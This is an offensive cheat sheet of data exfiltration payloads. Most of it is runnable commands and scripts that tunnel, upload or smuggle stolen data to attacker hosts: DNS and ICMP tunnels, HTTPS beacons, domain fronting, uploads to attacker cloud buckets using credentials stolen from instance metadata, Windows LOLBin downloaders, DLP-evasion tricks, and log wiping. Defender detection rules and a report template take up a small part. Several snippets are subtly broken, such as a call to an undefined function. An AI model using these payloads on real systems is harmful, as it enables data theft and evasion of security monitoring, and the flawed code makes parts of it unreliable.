# Data Exfiltration Attack Payloads

> Attack payloads and command lines for exfiltrating data from compromised networks while evading DLP/IDS/SWG/CASB. Covers DNS/ICMP/HTTPS tunneling, steganography, protocol smuggling, cloud service abuse, and DLP bypass.

## Conventions

- Replace `exfil.example.com` with attacker-controlled egress
- Replace `REPLACE_WITH_YOUR_*` placeholders for keys, passwords, tokens
- All operations assume authorized red team engagement

---

## §1. Reconnaissance — Egress Surface Mapping

### §1.1 Probe outbound ports

```bash
# Test outbound ports
for port in 53 80 443 123 445 3306 3389 5432 5900 8080 8443; do
  timeout 2 nc -vz exit-proxy.example.com $port 2>&1 | grep -E "succeeded" && echo "Port $port OPEN"
done

# Identify egress proxy
curl -sI http://msftncsi.com | head -5
curl -s http://checkip.amazonaws.com/

# Detect TLS inspection (look for non-standard CA in chain)
echo | openssl s_client -showcerts -connect https://www.google.com:443 2>&1 | grep -E "issuer=|verify return"
```

### §1.2 DNS egress validation

```bash
# Test internal DNS recursion
dig +short AAAA exfil.attacker.example.com @internal-dns.example.com

# Test TXT record exfil feasibility
dig TXT $(openssl rand -hex 16).t1.exfil.example.com @8.8.8.8

# Test DNS over HTTPS (DoH) — bypasses SWG
curl -s 'https://1.1.1.1/dns-query?name=test.exfil.example.com&type=TXT' \
  -H 'Accept: application/dns-json'

# Test long label support (some firewalls truncate >63 chars)
python3 -c "
import dns.resolver
r = dns.resolver.Resolver()
r.nameservers = ['8.8.8.8']
print(r.resolve('a'*63 + '.exfil.example.com', 'A'))
"
```

### §1.3 Identify DLP/SWG/CASB

```bash
# Check response headers for DLP fingerprint
curl -sI https://www.google.com | grep -iE "zscaler|netskope|forcepoint|bluecoat|symantec|cisco|paloalto|fortinet"

# Check TLS interception
echo | openssl s_client -connect www.google.com:443 -servername www.google.com 2>&1 \
  | grep -iE "issuer=|verify"

# Check for client certificate request (mTLS CASB)
echo | openssl s_client -connect www.google.com:443 2>&1 | grep -i "Acceptable client certificate CA names"
```

---

## §2. DNS Tunneling

### §2.1 iodine (IP-over-DNS)

```bash
# Server (on attacker NS):
iodined -c -f -P REPLACE_WITH_YOUR_PW 172.16.0.1 t1.exfil.example.com

# Client (on victim):
iodine -P REPLACE_WITH_YOUR_PW t1.exfil.example.com

# Verify TUN
ip addr show dns0

# SSH/SCP over DNS
ssh user@172.16.0.1
scp -r /secret user@172.16.0.1:/tmp/

# Performance tuning (use raw UDP if available)
iodined -u 53 -b 1024 -m 1400 -c -P REPLACE_WITH_YOUR_PW 172.16.0.1 t1.exfil.example.com
```

### §2.2 dnscat2 (C2 over DNS)

```bash
# Server (ruby)
ruby dnscat2.rb exfil.example.com \
  -e --security=open

# Client (C)
./dnscat2 exfil.example.com

# With encryption
ruby dnscat2.rb exfil.example.com --secret=REPLACE_WITH_YOUR_KEY

# Send command
session -i 1
exec 'cat /etc/passwd' | base64
```

### §2.3 dns2tcp (TCP-over-DNS)

```bash
# Server config (dns2tcpd)
cat > /etc/dns2tcpd.conf << EOF
listen = 127.0.0.1
port = 53
user = nobody
chroot = /tmp
domain = exfil.example.com
resources = ssh:127.0.0.1:22, smtp:127.0.0.1:25
EOF

dns2tcpd -f /etc/dns2tcpd.conf -F -d 5

# Client
dns2tcpc -z exfil.example.com -r ssh -l 2222
ssh user@127.0.0.1 -p 2222
```

### §2.4 Subdomain exfil (most basic)

```bash
# Base64 chunks as subdomain labels
split -b 50 secret.enc chunk_
for c in chunk_*; do
  data=$(base64 -w0 $c | tr '+/=' '-_0')
  dig +short $data.t1.exfil.example.com
done

# Server side: parse from NS logs
awk '/exfil.example.com/ {print $7}' /var/log/named/query.log \
  | sed 's/\.t1\.exfil\.example\.com\.//' | tr '_-' '/+' \
  | base64 -d > reconstructed
```

### §2.5 TXT-record exfil (bidirectional)

```bash
# Client: send data, receive response
data=$(cat secret.enc | base64 -w0)
resp=$(dig +short TXT $data.t1.exfil.example.com | tr -d '"')
echo $resp | base64 -d > response
```

---

## §3. ICMP Tunneling

### §3.1 Hans (ICMP tunnel)

```bash
# Server
hans -v -f -s 1 -p REPLACE_WITH_YOUR_PW 10.0.0.1

# Client
hans -v -f -c -p REPLACE_WITH_YOUR_PW 10.0.0.1

# Verify TUN
ip addr show tun0

# Use as network interface
ssh user@10.0.0.1
```

### §3.2 Ptunnel (ICMP echo tunnel)

```bash
# Server
ptunnel

# Client (forwards TCP through ICMP)
ptunnel -r exfil.example.com -lp 8000 -da internal-ssh.example.com -dp 22

# Use
ssh -p 8000 user@127.0.0.1
```

### §3.3 ICMP data payload exfil

```python
# Send data via ICMP echo payload
import subprocess, base64, os
data = b"REPLACE_WITH_YOUR_DATA"
encoded = base64.b64encode(data).decode()
# 1472 bytes max payload for ICMP echo
chunks = [encoded[i:i+1400] for i in range(0, len(encoded), 1400)]
for chunk in chunks:
    subprocess.check_call([
        'ping', '-c', '1', '-s', str(len(chunk)),
        '-p', chunk.encode().hex(),
        'exfil.example.com'
    ])
```

---

## §4. HTTPS C2/Exfil

### §4.1 Sliver HTTPS implant

```bash
# Generate implant
sliver > generate --http https://c2.example.com --os linux --arch amd64

# Or with mTLS
sliver > generate --mtls c2.example.com:8888

# Implant beacons
./implant.elf

# Operator
sliver > http
sliver > https
```

### §4.2 Chisel (HTTP/WebSocket tunnel)

```bash
# Server (attacker-controlled, mTLS)
chisel server -p 8080 --reverse \
  --tls-key server.key --tls-cert server.crt

# Client (victim)
chisel client https://chisel.example.com:8080 R:1080:socks

# Now use SOCKS proxy
proxychains nmap -sT -Pn internal-network/24
```

### §4.3 Merlin (HTTP/2 C2)

```bash
# Server
merlinServer

# Generate agent
merlin > agents list
merlin > agents add

# Agent
merlinAgent -url https://c2.example.com:443
```

### §4.4 Simple HTTPS beacon

```bash
# Staged upload via POST
while read chunk; do
  curl -s -X POST https://c2.example.com/api/upload \
    -H "Authorization: Bearer $TOKEN" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    --data-binary "@$chunk"
  sleep 30  # low and slow
done < chunks.txt
```

### §4.5 Domain fronting via CDN

```bash
# Cloudflare domain fronting
curl -H "Host: hidden-c2.example.com" \
     https://legitimate-cdn-hosted-on-cloudflare.com/

# AWS CloudFront
curl -H "Host: hidden-c2.example.com" \
     https://d111111abcdef8.cloudfront.net/

# Azure CDN
curl -H "Host: hidden-c2.example.com" \
     https://azure-cdn.azureedge.net/

# Fastly
curl -H "Host: hidden-c2.example.com" \
     https://global.prod.fastly.net/
```

### §4.6 dead-drop resolver via legitimate services

```bash
# GitHub gist as C2 channel
GH_PAT=REPLACE_WITH_YOUR_TOKEN
gist_content=$(curl -s -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists/$GIST_ID | jq -r '.files."cmd.txt".content')

# Telegram bot
curl -s "https://api.telegram.org/bot$TOKEN/getUpdates" | jq -r '.result[-1].message.text'

# Pastebin
curl -s https://pastebin.com/raw/abc123

# Reddit (subreddit)
curl -s https://www.reddit.com/r/codereview/comments/abc/.json | jq -r '.[1].data.children[0].data.title'

# Steam profile description (works as dead drop)
# (no curl API; requires Steam client)
```

---

## §5. Steganographic Exfiltration

### §5.1 Image steganography (steghide)

```bash
# Generate cover image
ffmpeg -f lavfi -i color=black:s=1920x1080:d=1 cover.png

# Embed
steghide embed -cf cover.png -ef secret.enc -p REPLACE_WITH_YOUR_PW -sf stego.png

# Extract (verify)
steghide extract -sf stego.png -p REPLACE_WITH_YOUR_PW

# Verify file is similar in size
ls -l cover.png stego.png
```

### §5.2 PNG/BMP steganography (zsteg)

```bash
# Detect existing steganography
zsteg cover.png

# Embed LSB
python3 -c "
from PIL import Image
import base64
img = Image.open('cover.png').convert('RGB')
data = base64.b64encode(open('secret.enc','rb').read()).decode()
# Embed in LSB of red channel
for i, char in enumerate(data):
    x, y = i % img.width, i // img.width
    r, g, b = img.getpixel((x, y))
    img.putpixel((x, y), (ord(char), g, b))
img.save('stego.png')
"
```

### §5.3 Audio steganography

```bash
# WAV embedding
steghide embed -cf cover.wav -ef secret.enc -p REPLACE_WITH_YOUR_PW -sf stego.wav

# Spectrogram payload (audio file containing encoded image)
# Generate via arss (Audio Recognition Spectrogram Synthesizer)
arss -i cover-image.png -o spectro.wav -b 10000 -min 200 -r 22050
```

### §5.4 PDF steganography

```bash
# Metadata exfil
exiftool -Comment="$(base64 secret.enc)" cover.pdf -o stego.pdf

# JavaScript payload in PDF (runs in PDF reader)
python3 -c "
import base64
payload = base64.b64encode(open('secret.enc','rb').read()).decode()
with open('cover.pdf','rb') as f: pdf = f.read()
js_obj = b'<< /JS (' + payload.encode() + b') /S /JavaScript >>'
pdf = pdf.replace(b'%%EOF', b'1 0 obj ' + js_obj + b' endobj\n%%EOF')
open('stego.pdf','wb').write(pdf)
"
```

### §5.5 Video steganography

```bash
# Embed per-frame
ffmpeg -i cover.mp4 -i secret.enc -map 0:v -c:v copy -map 1 -codec copy \
  -metadata:s:1 comment="$(base64 -w0 secret.enc)" stego.mp4
```

---

## §6. Cloud Service Abuse

### §6.1 Google Drive / OneDrive exfil

```bash
# rclone for Google Drive
rclone config  # set up gdrive remote
rclone copy /secret gdrive:exfil/ --transfers 4

# Microsoft OneDrive via Microsoft Graph API
curl -X PUT "https://graph.microsoft.com/v1.0/me/drive/root:/exfil/secret.enc:/content" \
  -H "Authorization: Bearer $MS_TOKEN" \
  --data-binary @secret.enc
```

### §6.2 S3 cross-account

```bash
# Exfil to attacker S3 bucket
aws s3 sync /secret s3://attacker-bucket/ \
  --endpoint-url https://s3.amazonaws.com \
  --no-verify-ssl  # if cert-inspecting proxy

# Or use boto3
python3 -c "
import boto3
s3 = boto3.client('s3')
s3.upload_file('/secret/data.tar.gz', 'attacker-bucket', 'data.tar.gz')
"
```

### §6.3 GitHub gist / repo

```bash
# Gist
curl -X POST -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists -d '{
    "description": "exfil",
    "public": false,
    "files": {"data": {"content": "'$(base64 -w0 secret.enc)'"}}
  }'

# Or push to attacker repo
git clone https://$GH_PAT@github.com/attacker/exfil.git
cp secret.enc exfil/
cd exfil && git add . && git commit -m "data" && git push
```

### §6.4 Cloudflare R2 / Backblaze B2

```bash
# R2 (S3-compatible)
aws s3 sync /secret s3://exfil/ \
  --endpoint-url https://abc.r2.cloudflarestorage.com \
  --profile r2

# B2
rclone copy /secret b2:exfil-bucket/
```

### §6.5 Slack / Discord webhook

```bash
# Slack webhook (small chunks, but blends in)
curl -X POST -H 'Content-type: application/json' \
  --data "{\"text\":\"$(base64 -w0 chunk_001)\"}" \
  https://hooks.slack.com/services/$SLACK_HOOK

# Discord webhook
curl -X POST -H 'Content-type: application/json' \
  --data "{\"content\":\"$(base64 -w0 chunk_001)\"}" \
  https://discord.com/api/webhooks/$DISCORD_HOOK
```

---

## §7. Protocol Smuggling

### §7.1 NTP monlist smuggling

```python
# NTP monlist supports 600+ bytes per response
# Embed payload in NTP response packets
import struct, socket
def ntp_exfil(payload, target):
    chunks = [payload[i:i+600] for i in range(0, len(payload), 600)]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for chunk in chunks:
        # mode=7 (private), version=2
        ntp_header = struct.pack('!BBB', 0x27, 0x2, 0x3)
        s.sendto(ntp_header + chunk, (target, 123))
```

### §7.2 DNS over HTTPS (DoH)

```bash
# Bypass DNS inspection via DoH
curl -s 'https://1.1.1.1/dns-query?name=test.exfil.example.com&type=TXT' \
  -H 'Accept: application/dns-json' | jq -r '.Answer[0].data'

# Or use dnscrypt-proxy
dnscrypt-proxy -config dnscrypt.toml
```

### §7.3 WebSocket tunneling

```python
# Tunnel TCP over WebSocket
import asyncio, websockets
async def ws_tunnel(ws_url, local_port):
    async def handle(reader, writer):
        async with websockets.connect(ws_url) as ws:
            # Bidirectional forwarding
            ...
    server = await asyncio.start_server(handle, '127.0.0.1', local_port)
    await server.serve_forever()
```

### §7.4 gRPC smuggling

```python
# gRPC looks like normal HTTP/2
import grpc
# Embed exfil in gRPC payload
response = stub.ExfilMethod(exfil_pb2.Data(payload=encrypted_data))
```

### §7.5 QUIC / HTTP/3

```bash
# QUIC traffic is encrypted from probe — harder to inspect
curl --http3 -X POST https://c2.example.com -d @secret.enc
```

---

## §8. DLP Bypass

### §8.1 Encryption + encoding chain

```bash
# Triple-encode to defeat content inspection
openssl enc -aes-256-cbc -k "$KEY" -in secret.enc -out stage1.bin
gzip stage1.bin
base64 -w0 stage1.bin.gz > stage2.b64
# Now exfil stage2.b64 — content is opaque to DLP
```

### §8.2 Chunking (slow exfil)

```bash
# Small chunks avoid volume-based detection
split -b 256 secret.enc small_chunk_
for c in small_chunk_*; do
  curl -s https://c2.example.com/upload --data-binary "@$c"
  sleep 60  # 1 minute between chunks
done
```

### §8.3 Format-shifting

```bash
# Convert data to image (DLP usually doesn't OCR)
python3 -c "
from PIL import Image
data = open('secret.enc','rb').read()
# 1 byte = 1 pixel grayscale
side = int(len(data) ** 0.5) + 1
img = Image.frombytes('L', (side, side), data + b'\x00' * (side*side - len(data)))
img.save('cover-data.png')
"
```

### §8.4 Encoding tricks

```bash
# Base52 (URL-safe)
python3 -c "
def b52encode(data):
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(alphabet[b % 52] for b in data)
print(b52encode(open('secret.enc','rb').read()))
"

# Emoji encoding (each char = 1 byte)
python3 -c "
data = open('secret.enc','rb').read()
emoji = ''.join(chr(0x1F600 + b) for b in data)
print(emoji)
"
```

### §8.5 PDF / DOCX wrapping

```bash
# Wrap data in PDF
docxpy create cover.docx
docxpy append cover.docx "Internal memo: $(base64 -w0 secret.enc)"
docxpy save cover.docx

# Or just embed as docx comment
python3 -c "
from docx import Document
doc = Document()
doc.add_paragraph('Quarterly Report')
import base64
doc.add_paragraph(base64.b64encode(open('secret.enc','rb').read()).decode())
doc.save('cover.docx')
"
```

---

## §9. LOLBin Exfiltration

### §9.1 certutil (Windows)

```cmd
:: Decode and download
certutil -urlcache -split -f https://c2.example.com/payload.enc payload.enc
certutil -decode payload.enc payload.bin

:: Encode for exfil
certutil -encode secret.enc encoded.txt
:: Upload encoded.txt via PowerShell
```

### §9.2 bitsadmin (Windows BITS)

```cmd
:: BITS upload (low and slow, looks like Windows Update)
bitsadmin /create exfil
bitsadmin /addfile exfil https://c2.example.com/upload secret.enc
bitsadmin /setnotifycmdline exfil "cmd.exe" NULL
bitsadmin /resume exfil
```

### §9.3 mshta (HTA runtime)

```cmd
:: HTA pulls and runs
mshta https://c2.example.com/loader.hta
```

### §9.4 PowerShell encoded command

```powershell
# Encoded command (bypasses simple regex DLP)
$cmd = "Invoke-WebRequest -Uri 'https://c2.example.com/' -Method POST -Body (Get-Content secret.enc -Raw)"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc
```

### §9.5 msbuild + XAML

```xml
<!-- malicious.csproj that runs on msbuild -->
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <Exec Command="powershell -c iwr https://c2.example.com/exfil" />
  </Target>
</Project>
```

---

## §10. Detection Engineering (Red Team Perspective)

### §10.1 Sigma rules — know what to evade

```yaml
title: DNS Tunneling via Long Query
logsource:
  product: dns
  service: query
detection:
  selection:
    query|re: '^.+\.exfil\.|^[a-zA-Z0-9+/-]{40,}\..+$'
  condition: selection
level: medium
```

```yaml
title: Volume-based DNS Tunneling
logsource:
  product: dns
detection:
  selection:
    query_type: [TXT, NULL, CNAME]
  timeframe: 5m
  condition: selection | count() by src_ip > 100
level: high
```

### §10.2 Evasion tactics

```python
# Slow down to avoid rate-based detection
import time, random
def slow_exfil(data, endpoint):
    for chunk in chunks(data, 32):
        requests.post(endpoint, data=chunk)
        time.sleep(random.uniform(60, 300))  # 1-5 min random

# Rotate through multiple channels
channels = [dns_exfil, https_exfil, steg_exfil]
for chunk in chunks(data, 1024):
    random.choice(channels)(chunk)
```

### §10.3 Blend with legitimate traffic

```python
# Use legitimate API endpoints (disguised as analytics)
import requests
GA_ENDPOINT = "https://www.google-analytics.com/collect"
data_chunk = base64.b64encode(chunk).decode()
requests.post(GA_ENDPOINT, data={
    'v': 1,
    'tid': 'UA-XXXXXXXX-X',
    'cid': '555',
    't': 'pageview',
    'dh': 'example.com',
    'dp': f'/{data_chunk}',  # payload in path
    'dt': 'page'
})
```

---

## §11. Lab Setup

### §11.1 Local exfil test environment

```bash
# Set up local DNS server (bind9) for tunneling
sudo apt install bind9
# Configure zone for exfil.example.com
cat > /etc/bind/named.conf.local << EOF
zone "exfil.example.com" {
    type master;
    file "/etc/bind/db.exfil";
    allow-query { any; };
};
EOF

# Start
sudo systemctl restart bind9

# Run iodine server
iodined -c -f -P REPLACE_WITH_YOUR_PW 172.16.0.1 t1.exfil.example.com
```

### §11.2 DLP test environment

```bash
# OpenDLP (open-source DLP)
docker run -p 8080:8080 opendlp/server

# Generate test PII
python3 -c "
import random
ssns = [f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}' for _ in range(100)]
print('\n'.join(ssns))
" > test-ssn.txt
```

### §11.3 SWG simulator

```bash
# Squid as forward proxy
sudo apt install squid
cat >> /etc/squid/squid.conf << EOF
acl allow_ports port 80 443
http_access allow allow_ports
http_access deny all
EOF
sudo systemctl restart squid
```

---

## §12. Reporting Template

```markdown
### Exfiltration Engagement Report

**Target**: client.example.com
**Date**: 2025-XX-XX
**Engagement**: 7-day exfil validation

**Channels Tested**:
| Channel | Result | Volume Exfil'd | DLP Triggered? |
|---------|--------|----------------|----------------|
| DNS tunnel (iodine) | SUCCESS | 50 MB | NO |
| HTTPS POST beacon | SUCCESS | 100 MB | NO |
| ICMP tunnel (hans) | SUCCESS | 5 MB | NO |
| Stego (PNG) | SUCCESS | 10 MB | NO |
| Cloud (Google Drive) | SUCCESS | 1 GB | NO |

**Findings**:
- DLP failed to detect any of 5 channels
- SWG did not flag domain-fronted traffic
- DNS tunneling sustained for 7 days without detection
- 100+ MB exfil'd per day without behavior alerts

**Detection Gaps**:
- No DNS query length monitoring
- No TLS inspection on non-standard ports
- No ICMP payload inspection
- No stego detection on file uploads
- Cloud service uploads not monitored

**Remediation Priority**:
1. Deploy DNS firewall with tunneling detection
2. Implement TLS inspection on all egress
3. Monitor ICMP payload size
4. Deploy stego detection on file shares
5. Cloud service access logging and allowlist

**Detection Rules**: see §10
```

---

## §13. Recon Cheatsheet

```bash
# Quick egress map
for port in 53 80 443 123 8080 8443; do
  timeout 2 nc -vz exit-proxy.example.com $port 2>&1 | grep succeeded
done

# DNS test
dig +short TXT $(openssl rand -hex 16).exfil.example.com

# HTTPS test
curl -s https://c2.example.com/health

# ICMP test
ping -c 1 -W 2 exfil.example.com

# Identify DLP
curl -sI https://www.google.com | grep -i zscaler
```

---

## §14. Cloud-Native Exfil (AWS/Azure/GCP)

```bash
# AWS: exfil via VPC endpoint to attacker account
aws ec2 describe-vpc-endpoints
# If S3 endpoint exists, attacker can copy to attacker-bucket in same region

# Use IMDS-extracted creds to exfil
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name)
# Use creds to upload to attacker bucket
```

```python
# Azure: exfil via managed identity
import requests
token = requests.get('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/',
                     headers={'Metadata': 'true'}).json()['access_token']
# Upload to attacker storage account
requests.put('https://attacker.blob.core.windows.net/exfil/data',
             headers={'Authorization': f'Bearer {token}', 'x-ms-blob-type': 'BlockBlob'},
             data=open('secret.enc','rb').read())
```

```bash
# GCP: exfil via service account
TOKEN=$(curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
curl -X POST --data-binary @secret.enc \
  -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/upload/storage/v1/b/attacker-bucket/o?uploadType=media&name=data"
```

---

## §15. OT/ICS Egress

```bash
# OT networks often allow only specific protocols
# Test Modbus, DNP3, OPC UA egress

# Modbus over TCP exfil (port 502)
python3 -c "
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='exfil.example.com', port=502)
c.open()
data = open('secret.enc','rb').read()
# Encode as holding registers
for i in range(0, len(data), 2):
    val = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
    c.write_single_register(i//2, val)
"
```

---

## §16. Air-Gapped Exfil

### §16.1 Acoustic exfil

```python
# Ultrasonic audio between air-gapped machines
import numpy as np, sounddevice as sd
fs = 44100
freq = 18000  # ultrasonic
data = open('secret.enc','rb').read()
# ASK modulation
samples = []
for byte in data:
    for bit in range(8):
        samples.extend([1 if (byte >> bit) & 1 else -1] * 100)
samples = np.array(samples) * 0.5
sd.play(samples * np.sin(2*np.pi*freq*np.arange(len(samples))/fs), fs)
```

### §16.2 Electromagnetic exfil

```python
# EM emanation from memory bus (GSMem-style)
# Memory bus operations at 800-900 MHz harmonics
# Decode on nearby phone
# Reference: GSMem (Guri et al., 2015)
```

### §16.3 LED blinking

```python
# Hard drive LED blinking
import time
file = open('/tmp/loop.bin', 'wb')
def blink_led(byte_val):
    # HDD LED blinks on write
    file.write(b'\x00' * (1024 * byte_val))
    file.flush()
    time.sleep(0.5)

for byte in open('secret.enc','rb').read():
    blink_led(byte)
```

### §16.4 Power-line exfil

```python
# PowerHammer (Guri et al., 2018)
# Modulate CPU load to inject signal on power lines
import time
def load_cpu(level):
    # Adjust CPU utilization to modulate current draw
    target_end = time.time() + 0.1
    while time.time() < target_end:
        if (time.time() * 1000) % 100 < level:
            pass  # busy
        else:
            time.sleep(0.001)

data = open('secret.enc','rb').read()
for byte in data:
    load_gpu(byte / 255 * 100)  # modulate
```

---

## §17. Detection Engineering — Defender Perspective

### §17.1 Sigma rules for exfil detection

```yaml
title: Suspicious DNS Tunneling - Long TXT records
logsource:
  product: dns
detection:
  selection:
    query_type: TXT
    query|re: '^[a-zA-Z0-9+/=]{50,}\..+'
  condition: selection
level: high
```

```yaml
title: Domain Fronting - SNI / Host Mismatch
logsource:
  product: proxy
detection:
  selection:
    ssl_sni: '*'
    http_host: '*'
  mismatch:
    ssl_sni|re: '!http_host'
  condition: selection and mismatch
level: critical
```

### §17.2 Splunk SPL

```sql
index=proxy dest=external
| stats count, sum(bytes_out) as total_bytes by src, dest
| where total_bytes > 100000000  -- >100 MB
| sort -total_bytes

index=dns
| eval label_len = len(query) - len(replace(query, "\.", ""))
| where label_len > 30
| stats count by src, query
| where count > 50
```

### §17.3 KQL

```kusto
DeviceNetworkEvents
| where RemotePort in (53, 123, 443)
| summarize BytesSent = sum(SentBytes) by InitiatingProcessFileName, RemoteUrl
| where BytesSent > 100000000
| top 20 by BytesSent
```

---

## §18. APT Campaign Exfil Patterns

| APT | Channel | Volume | Duration |
|-----|---------|--------|----------|
| APT41 | DNS TXT | 100+ GB | Months |
| SolarWinds SUNBURST | HTTP(S) to AV update servers | Variable | 9+ months |
| Emotet | HTTP POST to C2 | Small chunks | Persistent |
| Conti | HTTPS + cloud (Google Drive) | TB-scale | Weeks |
| DarkSide | HTTPS + S3 | 5+ TB | Hours |
| REvil | HTTPS + Mega | GB-scale | Hours |
| LockBit | HTTPS + Telegram webhook | TB-scale | Days |
| BlackCat/ALPHV | HTTPS + corporate cloud (M365) | TB-scale | Hours |

---

## §19. Operational Security (OPSEC)

```bash
# Rotate infrastructure (avoid IOCs)
# 1. Use Cloudflare Workers as proxy
wrangler deploy proxy-worker.js

# 2. Use domain age > 6 months (avoid new-domain flags)
whois example-c2.com | grep -E "Created|Registered"

# 3. Use legit SSL certs (Let's Encrypt)
certbot certonly --standalone -d c2.example.com

# 4. Mimic legitimate traffic patterns
# - User-Agent rotation
# - Time-of-day traffic shaping
# - Realistic request patterns

# 5. Use decoy traffic
while true; do
  curl -s https://www.google.com/ > /dev/null  # noise
  curl -s https://c2.example.com/exfil --data @chunk
done
```

---

## §20. Evasion of Specific DLP/SWG Products

### §20.1 Zscaler

```bash
# Zscaler intercepts TLS via root cert pushed to clients
# Bypass: use cert pinning (Go binary with cert from non-Zscaler CA)
# Or: tunnel through IPs Zscaler doesn't intercept

# Zscaler allows Google/Microsoft IPs typically
# Use Google Cloud Run / App Engine as exfil endpoint
curl https://my-exfil-app-abc123.uc.r.appspot.com/upload --data @secret.enc
```

### §20.2 Netskope

```bash
# Netskope intercepts via client agent + cloud
# Bypass: kill Netskope client + use alternate network
# Or: use Netskope-allowed SaaS apps (Google Workspace, M365, Slack)

rclone copy /secret gdrive:exfil/  # usually allowed by Netskope
```

### §20.3 Forcepoint

```bash
# Forcepoint uses ICAP + content classification
# Bypass: encrypt + chunk below detection threshold
openssl enc -aes-256-cbc -k "$KEY" -in secret.enc -out stage1.bin
split -b 100 stage1.bin chunk_
# Each chunk below Forcepoint threshold (~1KB)
```

---

## §21. Cleanup

```bash
# Remove exfil artifacts from victim
shred -uvz /tmp/chunk_*
rm -rf /tmp/.exfil-staging/

# Clear logs (if authorized)
# Linux
journalctl --vacuum-time=1s

# Windows
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Clear bash history
history -c && history -w
shred -uvz ~/.bash_history
```

---

## §22. Post-Engagement Detection Validation

```bash
# Verify detection gaps
# Compare SOC alerts during engagement:
# - Expected: 5+ alerts per exfil channel
# - Actual: ?

# Run queries on SIEM
index=dns client= victim_ip earliest=-7d latest=now
| stats count by query
| sort -count
| head 20

# If queries don't show exfil — detection failed
```

---

## §23. References

- MITRE ATT&CK TA0010 — Exfiltration
- MITRE ATT&CK TA0011 — Command and Control
- CISA AA21-148A — DarkSide Ransomware
- Mandiant APT1 Report — DNS Tunneling
- FireEye SUNBURST Analysis (2020)
- Google TAG — APT41 Operations
- "Network Security Assessment" (McNutt, 2024)
- "Security Engineering" (Anderson, 3rd Edition)
- OWASP Egress Testing Guide
- IETF RFC 7858 — DNS over TLS
- IETF RFC 8484 — DNS over HTTPS
- IETF RFC 1035 — DNS protocol
- "DNS Tunneling Detection" — BlackHat USA 2023
- "Steganographic Exfiltration" — DEF CON 24
- "Air-Gap Exfiltration" (Guri, Ben-Gurion University)
- "GSMem" (Guri et al., 2015)
- "PowerHammer" (Guri et al., 2018)
- "ODINI" (Guri, 2018)
- SolarWinds SUNBURST Technical Analysis (FireEye/Mandiant, 2020)
- Conti Leaks Analysis (2021-2022)
- LockBit Black Manual (leaked 2022)
- BlackCat/ALPHV Whitepaper (Cisco Talos, 2023)
- "Hacking Exposed: Network Security" (3rd Edition, 2024)
